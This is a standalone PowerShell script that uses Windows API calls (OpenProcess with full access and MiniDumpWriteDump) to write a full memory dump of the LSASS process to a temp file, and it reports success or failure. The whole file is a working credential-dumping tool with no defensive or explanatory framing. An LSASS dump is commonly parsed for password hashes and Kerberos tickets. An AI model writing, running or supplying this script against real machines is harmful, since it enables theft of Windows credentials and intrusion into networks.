# Define the output path for the dump file
$dumpFilePath = "C:\Windows\Temp\lsass.dmp"

# Ensure the output directory exists
if (-not (Test-Path (Split-Path $dumpFilePath))) {
    New-Item -Path (Split-Path $dumpFilePath) -ItemType Directory | Out-Null
}

# Define the function to load the necessary Windows API functions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class DbgHelp
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);

    public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    public const int MiniDumpWithFullMemory = 0x00000002;
}
"@

# Get the process ID of lsass.exe
$process = Get-Process -Name lsass
$processId = $process.Id

# Open the process with necessary permissions
$processHandle = [DbgHelp]::OpenProcess([DbgHelp]::PROCESS_ALL_ACCESS, $false, $processId)
if ($processHandle -eq [IntPtr]::Zero) {
    Write-Host "Failed to open process lsass.exe"
    exit
}

# Create or open the dump file
$fileStream = [System.IO.File]::Open($dumpFilePath, [System.IO.FileMode]::Create)
$fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()

# Call MiniDumpWriteDump to create the dump
$result = [DbgHelp]::MiniDumpWriteDump(
    $processHandle,
    $processId,
    $fileHandle,
    [DbgHelp]::MiniDumpWithFullMemory,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)

if (-not $result) {
    Write-Host "Failed to dump lsass.exe. Error: $([System.ComponentModel.Win32Exception]::new([Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
} else {
    Write-Host "Successfully dumped lsass.exe to $dumpFilePath"
}

# Clean up handles
$fileStream.Close()
[DbgHelp]::CloseHandle($processHandle)
